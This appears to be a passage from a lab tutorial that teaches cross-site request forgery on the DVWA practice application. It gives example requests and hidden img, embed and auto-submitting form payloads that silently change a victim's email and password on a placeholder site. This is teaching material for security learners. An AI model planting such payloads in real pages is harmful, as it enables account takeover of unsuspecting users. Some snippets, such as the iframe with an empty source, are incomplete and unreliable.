## 1. CSRF Attack

![](https://portswigger.net/web-security/images/cross-site%20request%20forgery.svg)
>We will use DVWA Labs To Learn CSRF Attack


**What is CSRF Attack?**

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality. 

**Example URL (GET Method)**

```
http://target-vuln-web.com/email/change?email=attacker@anon.net
http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass
```
**Example Request (POST Method)**

```
POST /email/change HTTP/1.1
Host: target-vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=cookievalues

email=attacker@anon.net
```

```
POST user/new_password HTTP/1.1
Host: target-vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=cookievalues

password=newpass&comfirm_password=newpass
```

**Exploit CSRF Vulnerability Via HTML Injections (GET Method)**

>Using Image Tag
```
<img style="display:none;" src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass">
```

>Using Iframe Tag
```
 <iframe src="" style="display:none;"></iframe> 
```

>Using Embed Tag
```
 <embed type="image/jpg" src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass" style="display:none;"> 
```

**Exploit CSRF Vulnerability Via HTML Injections (POST Method)**

>Form + Script Tag
```
<form action="http://target-vuln-web.com/user/new_password" method="POST">
            <input type="hidden" name="password" value="newpass" />
            <input type="hidden" name="comfirm_password" value="newpass" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
```
